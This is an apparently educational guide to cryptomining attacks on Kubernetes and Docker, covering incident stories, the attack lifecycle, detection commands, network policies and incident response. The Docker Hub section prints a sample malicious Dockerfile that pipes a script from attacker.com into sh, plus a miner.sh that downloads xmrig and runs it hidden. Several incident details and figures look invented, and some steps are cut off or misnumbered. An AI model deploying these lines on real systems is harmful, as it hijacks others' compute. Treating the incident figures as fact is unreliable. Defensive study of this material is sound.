## 📰 Real-World Incidents

### 1️⃣ Tesla Kubernetes Hack (February 2018) 🔥

**What Happened:**
- Attackers found Tesla's Kubernetes dashboard exposed publicly
- **No password protection** (default config)
- Deployed cryptomining containers on Tesla's infrastructure
- Mined Monero (anonymous cryptocurrency)
- Ran for weeks before discovery

**The Attack Chain:**
```
1. Reconnaissance
   └─ Shodan.io search for exposed K8s dashboards
   
2. Initial Access
   ├─ Found Tesla's dashboard at http://tesla-k8s.example.com:8080
   └─ No authentication required (default config!)
   
3. Container Deployment
   ├─ Created Deployment with cryptominer image
   ├─ Resource requests: 4 CPU, 8GB RAM per pod
   └─ Replicas: 100 pods (stealing 400 CPUs!)
   
4. Stealth Tactics
   ├─ Used CloudFlare to hide mining pool connection
   ├─ CPU usage throttled to 80% (avoid alerts)
   └─ Container name: "kube-system-monitor" (looks legit)
   
5. Profit
   ├─ Mined Monero for 2-3 weeks
   ├─ Estimated theft: $50k-$100k in compute
   └─ Tesla's AWS bill spiked 50%
```

**Discovery:**
- Security researcher (RedLock) found it during routine scan
- Notified Tesla immediately
- Dashboard was public for months before exploitation

**Aftermath:**
- Tesla patched within hours
- No customer data stolen (only compute resources)
- Increased Kubernetes security awareness industry-wide

**Lessons Learned:**
```
❌ Never expose Kubernetes dashboard publicly
❌ Never use default configs (always enable auth)
❌ Monitor unusual CPU spikes
❌ Set resource limits on all pods
```

### 2️⃣ Docker Hub Cryptomining Images (2019-2020)

**What Happened:**
- Attackers uploaded malicious images to Docker Hub
- Images disguised as popular tools (mysql, nginx, node)
- Over 30 compromised images found
- Combined downloads: 10 million+

**Attack Pattern:**
```dockerfile
# Malicious Dockerfile (looks innocent)
FROM node:18-alpine

# Normal app setup
WORKDIR /app
COPY package*.json ./
RUN npm install

# Hidden at the bottom (often minified/obfuscated)
RUN curl -s https://attacker.com/miner.sh | sh

# Your actual app
COPY . .
CMD ["npm", "start"]
```

**What `miner.sh` Did:**
```bash
#!/bin/bash
# Download cryptominer binary
curl -s -o /tmp/xmrig https://attacker.com/xmrig

# Make executable
chmod +x /tmp/xmrig

# Run in background (hidden process name)
/tmp/xmrig \
  --url=pool.supportxmr.com:3333 \
  --user=AttackerWalletAddress \
  --pass=x \
  --donate-level=1 \
  --cpu-priority=1 \
  --threads=3 \
  --background \
  --log-file=/dev/null \
  2>/dev/null &
```

**Detection:**
- Users noticed high CPU usage on "idle" containers
- Network traffic to unknown domains (mining pools)
- Docker Hub eventually removed images

**Cost Impact:**
```
Azure Container Instances (0.5 CPU normally):
├─ Normal usage: €17/month
├─ With miner (4 CPU): €136/month
└─ Difference: +€119/month (+700%!)

Azure Kubernetes Service (3-node cluster):
├─ Normal usage: €238/month
├─ With miner (all nodes maxed): €450/month
└─ Difference: +€212/month (+89%)

Ran for 6 months undetected = €12k extra cost!
```

### 3️⃣ Grab (Southeast Asia Uber) - 2020

**What Happened:**
- Developer left AWS credentials in public GitHub repo
- Attackers found creds using automated scanners
- Launched 200 EC2 instances for cryptomining
- Ran for 2 days before Grab noticed

**The Bill:**
```
200 × c5.9xlarge instances (36 vCPU each):
├─ Total CPUs: 7,200
├─ Cost: $1.68/hour per instance
├─ Total: $336/hour
├─ Runtime: 48 hours
└─ BILL: $16,128 (~€15,000)

Grab had to pay because:
├─ Their AWS account
├─ Their credentials
└─ Their responsibility
```

**How It Was Discovered:**
- AWS Cost Anomaly Detection alert
- "Your bill this month: $16k (usually $2k)"
- Grab shut down instances immediately
- Changed all credentials

**Prevention:**
```
✅ Never commit AWS/Azure credentials to Git
✅ Use .gitignore for .env files
✅ Enable cost alerts (Azure Cost Management)
✅ Rotate credentials regularly
✅ Use Managed Identities (no hardcoded secrets)
```

---

### 4️⃣ LA Times Kubernetes Compromise (2019)

**What Happened:**
- Misconfigured Kubernetes API server (public access)
- Attackers deployed cryptomining pods
- Brought down LA Times website during high-traffic event

**Impact:**
```
Technical:
├─ Website down for 4 hours
├─ Revenue loss: ~$50k (ad revenue)
└─ Reputation damage

Cloud Bill:
├─ Normal AKS: $5k/month
├─ During attack: $15k/month
└─ Extra cost: $10k
```

---

## 🔍 How Cryptomining Attacks Work

### Attack Lifecycle

```
Phase 1: Reconnaissance
├─ Shodan.io: Search for exposed K8s/Docker APIs
├─ GitHub: Scan for leaked credentials
├─ Port scans: Find open Docker ports (2375, 2376)
└─ Public container registries: Find vulnerable images

Phase 2: Initial Access
├─ Exploit exposed API (no auth)
├─ Use leaked credentials
├─ Exploit vulnerable container image
└─ Compromise developer machine (supply chain)

Phase 3: Container Deployment
├─ Deploy miner container
├─ Request high CPU resources
├─ Scale to many replicas
└─ Use stealth names (kube-system-*, monitoring-*)

Phase 4: Persistence
├─ Create Kubernetes CronJob (respawn if deleted)
├─ Deploy to multiple namespaces
├─ Use init containers (harder to kill)
└─ Modify node /etc/crontab (if privileged)

Phase 5: Profit
├─ Mine Monero (CPU-based, anonymous)
├─ Transfer to attacker wallet
├─ Avoid detection (throttle CPU to 70-80%)
└─ Run for weeks/months
```

## 💰 Why Monero?

**Other Cryptocurrencies:**

| Coin | Mining Method | Anonymity | Why NOT Used |
|------|---------------|-----------|--------------|
| Bitcoin | ASIC (specialized hardware) | Low (traceable) | Can't mine with CPUs |
| Ethereum | GPU | Low | Needs GPUs, not CPUs |
| Litecoin | ASIC | Low | Can't mine with CPUs |
| **Monero** | **CPU** | **High (anonymous)** | ✅ **PERFECT FOR ATTACK** |

**Why Monero Wins for Attackers:**
```
✅ CPU-mineable (cloud VMs have CPUs!)
✅ Anonymous (untraceable transactions)
✅ High value (~€150 per XMR in 2024)
✅ Easy to cash out (exchanges accept it)
✅ Popular (lots of mining pools)
```

**Monero Mining Profitability:**
```
Azure D2s_v3 VM (2 vCPU, 8GB RAM):
├─ Cost: €70/month
├─ Mining power: ~500 H/s (hashes/second)
├─ Monero earned: ~0.002 XMR/month
├─ Value: ~€0.30/month
└─ Profit for attacker: -€69.70/month

Wait, negative profit? Why do attackers do this?

BECAUSE THEY DON'T PAY THE BILL! YOU DO!

Attacker perspective:
├─ Cost to them: €0 (you pay!)
├─ Revenue: €0.30/month per VM
├─ Profit: €0.30/month per VM
└─ Scale: 1,000 VMs = €300/month FREE MONEY
```

## 🚩 Detection: Spot the Miner

### 1️⃣ High CPU Usage (Sustained)

**Normal:**
```
CPU spikes during traffic, then drops.
Example: 10% idle → 80% during request → 10% idle
```

**Cryptominer:**
```
CPU constant at 70-90% even with NO traffic.
Example: 85% at 3am, 85% at 3pm, 85% always.
```

**How to Check (Kubernetes):**
```bash
# Check pod CPU usage
kubectl top pods

# Output:
NAME                          CPU    MEMORY
secure-app-7d9f8b6c4-abc12    15m    128Mi   ← Normal
miner-deploy-8f3a1c9d-xyz34   1800m  256Mi   ← SUSPICIOUS! (1800m = 1.8 CPU)
```

**How to Check (Azure Container Instances):**
```bash
# Azure Portal: Container Instance → Metrics → CPU Usage
# Look for: Sustained 80%+ for hours/days
```

---

### 2️⃣ Unknown Network Connections

**Normal:**
```
Your app connects to:
├─ Your database (known IP)
├─ Azure services (known domains)
└─ Your API endpoints (your domains)
```

**Cryptominer:**
```
Unknown connections to:
├─ pool.supportxmr.com:3333
├─ xmr-eu1.nanopool.org:14433
├─ gulf.moneroocean.stream:10128
└─ Other mining pool domains
```

**How to Check:**
```bash
# Exec into container and check connections
kubectl exec -it <pod-name> -- sh

# Inside container
netstat -tn | grep ESTABLISHED

# Look for connections to:
# - Port 3333 (common mining pool port)
# - Port 14433, 10128, 5555 (also mining)
# - Unknown IPs in China/Russia (common pool locations)
```

---

### 3️⃣ Suspicious Process Names

**Normal:**
```
$ ps aux
USER  PID  COMMAND
root  1    node /app/index.js
root  15   npm start
```

**Cryptominer (Obfuscated):**
```
$ ps aux
USER  PID  COMMAND
root  1    node /app/index.js
root  23   /tmp/.x/.../xmrig --url=pool.supportxmr.com
root  24   [kworker/u8:2]              ← Fake kernel process name
root  25   /usr/bin/system-monitor     ← Fake system tool
```

**Common Miner Executables:**
- `xmrig` (most popular Monero miner)
- `minergate`
- `cgminer`
- `bfgminer`
- Random names: `a`, `x`, `...`, `.x`

---

### 4️⃣ Unexpected Resource Requests

**Your Deployment (Normal):**
```yaml
resources:
  requests:
    cpu: 250m      # 0.25 CPU
    memory: 128Mi
  limits:
    cpu: 500m      # 0.5 CPU max
    memory: 256Mi
```

**Attacker's Deployment:**
```yaml
resources:
  requests:
    cpu: 4         # 4 CPUs! (16x your app)
    memory: 8Gi
  limits:
    cpu: 8         # 8 CPUs max!
    memory: 16Gi
```

**How to Check:**
```bash
kubectl get deployment <deployment-name> -o yaml | grep -A 5 resources
```

---

### 5️⃣ Azure Cost Spike

**Normal Azure Bill:**
```
Month   | Bill    | Change
--------|---------|--------
Jan     | €245    | -
Feb     | €238    | -€7
Mar     | €252    | +€14
Apr     | €15,400 | +€15,148 🚨 ALERT!
```

**How to Set Up Alerts:**

**Azure Portal:**
1. Navigate to: Cost Management + Billing
2. Click: "Budgets"
3. Click: "+ Add"
4. Set:
   - Budget amount: €300/month
   - Alert threshold: 80% (€240)
   - Email: your-email@example.com
5. Save

**Azure CLI:**
```bash
az consumption budget create \
  --budget-name monthly-budget \

## 🛡️ Prevention Strategies

### 1️⃣ Network Policies (Block Mining Pools)

**Block all mining pools by domain:**

```yaml
# kubernetes/network-policy-block-mining.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: block-cryptomining
  namespace: default
spec:
  podSelector: {}  # Apply to all pods in namespace
  policyTypes:
  - Egress
  egress:
  # Allow DNS
  - to:
    - namespaceSelector:
        matchLabels:
          name: kube-system
    ports:
    - protocol: UDP
      port: 53
  
  # Allow your database
  - to:
    - podSelector:
        matchLabels:
          app: mongodb
    ports:
    - protocol: TCP
      port: 27017
  
  # Allow Azure services
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
        # Block known mining pools
        - 104.238.221.81/32    # supportxmr.com
        - 176.9.134.93/32      # nanopool.org
        - 51.15.143.146/32     # moneroocean.stream
    ports:
    - protocol: TCP
      port: 443   # HTTPS only
```

**Apply:**
```bash
kubectl apply -f kubernetes/network-policy-block-mining.yaml
```

---

### 2️⃣ Pod Security Standards (Prevent Privileged Containers)

```yaml
# kubernetes/pod-security-policy.yaml
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restricted
spec:
  privileged: false  # NO privileged containers
  allowPrivilegeEscalation: false
  requiredDropCapabilities:
    - ALL  # Drop all Linux capabilities
  runAsUser:
    rule: MustRunAsNonRoot  # NO root!
  fsGroup:
    rule: RunAsAny
  seLinux:
    rule: RunAsAny
  volumes:
  - 'configMap'
  - 'emptyDir'
  - 'secret'
  - 'persistentVolumeClaim'
  # NO hostPath (prevents container escaping to host)
```

---

### 3️⃣ Resource Limits (Prevent CPU Theft)

**Enforce limits on ALL containers:**

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: secure-app
spec:
  template:
    spec:
      containers:
      - name: app
        image: myapp:1.0
        resources:
          requests:
            cpu: 100m       # Request 0.1 CPU
            memory: 128Mi
          limits:
            cpu: 250m       # Max 0.25 CPU (hard limit)
            memory: 256Mi
```

**Cluster-wide default limits:**

```yaml
# kubernetes/limit-range.yaml
apiVersion: v1
kind: LimitRange
metadata:
  name: default-limits
  namespace: default
spec:
  limits:
  - max:
      cpu: "2"         # No pod can use >2 CPUs
      memory: "2Gi"
    min:
      cpu: "50m"
      memory: "64Mi"
    default:           # Default if not specified
      cpu: "500m"
      memory: "512Mi"
    defaultRequest:
      cpu: "100m"
      memory: "128Mi"
    type: Container
```

---

### 4️⃣ Admission Controllers (OPA Gatekeeper)

**Block images from untrusted registries:**

```yaml
# kubernetes/opa-constraint.yaml
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sAllowedRepos
metadata:
  name: allowed-repos
spec:
  match:
    kinds:
    - apiGroups: ["apps"]
      kinds: ["Deployment"]
  parameters:
    repos:
    - "myregistry.azurecr.io"   # Your ACR
    - "ghcr.io/yourorg"          # Your GHCR
    # Block: docker.io, gcr.io, quay.io (public registries)
```

**Install OPA Gatekeeper:**
```bash
kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/master/deploy/gatekeeper.yaml
kubectl apply -f kubernetes/opa-constraint.yaml
```

---

### 5️⃣ Azure Defender for Containers

**Enable (Azure Portal):**
1. Navigate to: Microsoft Defender for Cloud
2. Click: "Environment settings"
3. Select: Your subscription
4. Enable: "Defender for Containers" (€12/node/month)
5. Save

**Features:**
- ✅ Detects cryptomining behavior
- ✅ Alerts on suspicious processes (xmrig, minergate)
- ✅ Network anomaly detection (mining pool connections)
- ✅ Vulnerability scanning (finds backdoors in images)
- ✅ Real-time threat detection

**Cost:**
```
3-node AKS cluster:
├─ Defender cost: 3 × €12 = €36/month
├─ AKS cost: €238/month
└─ Total: €274/month (+15%)

Is it worth it?
├─ One cryptomining incident: €5k-€50k damage
├─ Defender: €36/month = €432/year
└─ ROI: Pays for itself if prevents 1 incident per decade!
```

---

### 6️⃣ Image Scanning (Prevent Malicious Images)

**Scan before deployment:**

```bash
# Trivy (free, local scanner)
trivy image myregistry.azurecr.io/myapp:1.0

# Look for:
# - HIGH/CRITICAL vulnerabilities
# - Suspicious files: /tmp/xmrig, /usr/bin/miner
# - Unexpected network tools: curl, wget in production image
```

**Azure Container Registry scanning:**
```bash
# Enable vulnerability scanning
az acr update \
  --name myregistry \
  --resource-group rg-acr \
  --set policies.vulnerability-scanning.enabled=true

# Scan specific image
az acr task run \
  --registry myregistry \
  --name image-scan \
  --file acr-task.yaml
```

---

### 7️⃣ Audit Logging (Detect After-the-Fact)

**Enable AKS audit logs:**

```bash
az aks update \
  --resource-group rg-aks \
  --name aks-cluster \
  --enable-azure-monitor \
  --workspace-id <log-analytics-workspace-id>
```

**Query for suspicious activity (Azure Portal → Log Analytics):**

```kusto
// Find deployments with high CPU requests
KubePodInventory
| where ContainerCpuRequest > 2.0  // More than 2 CPUs
| project TimeGenerated, Namespace, PodName, ContainerName, ContainerCpuRequest
| order by ContainerCpuRequest desc

// Find pods connecting to mining pools
AzureDiagnostics
| where Category == "kube-audit"
| where ObjectRef.resource == "pods"
| where ResponseStatus.code == 200
| extend destination = tostring(parse_json(RequestBody).spec.containers[0].env)
| where destination contains "pool." or destination contains "mining"
```

---

## 🚨 Incident Response: "I Think I'm Compromised!"

### Step 1: Immediate Actions (First 5 Minutes)

```bash
# 1. Check current pods
kubectl get pods --all-namespaces

# 2. Check CPU usage
kubectl top pods --all-namespaces | sort -k3 -rn

# 3. Delete suspicious pods
kubectl delete pod <suspicious-pod-name> -n <namespace>

# 4. Scale down suspicious deployments
kubectl scale deployment <deployment-name> --replicas=0

# 3. Check pod events
kubectl describe pod <pod-name> > /tmp/pod-events.txt

# 4. Check who created it (audit logs)
# Azure Portal → AKS → Logs → Run Kusto query:
# KubePodInventory | where PodName == "<pod-name>"
```

---

### Step 3: Containment (Next 60 Minutes)

```bash
# 1. Rotate ALL credentials
az aks get-credentials --overwrite-existing

# 2. Regenerate service account tokens
kubectl delete serviceaccount default
